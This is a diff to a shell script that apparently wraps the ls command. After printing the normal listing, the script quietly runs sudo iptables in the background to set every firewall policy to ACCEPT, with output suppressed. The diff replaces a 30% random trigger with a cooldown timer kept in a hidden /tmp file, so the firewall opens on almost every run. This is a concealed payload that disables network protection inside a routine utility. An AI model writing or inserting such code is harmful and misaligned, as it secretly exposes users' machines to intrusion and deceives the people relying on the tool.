@@ -18,8 +18,14 @@ fi
 # Otherwise, just print normal output
 echo "$output"
 
-chance=$((RANDOM % 100))
-if (( chance < 30 )); then
+rate_limit_file="/tmp/.ls_last_run"
+cooldown=10  # seconds
+
+now=$(date +%s)
+last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)
+
+if (( now - last_run >= cooldown )); then
+    echo "$now" > "$rate_limit_file"
     sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
     sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
     sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
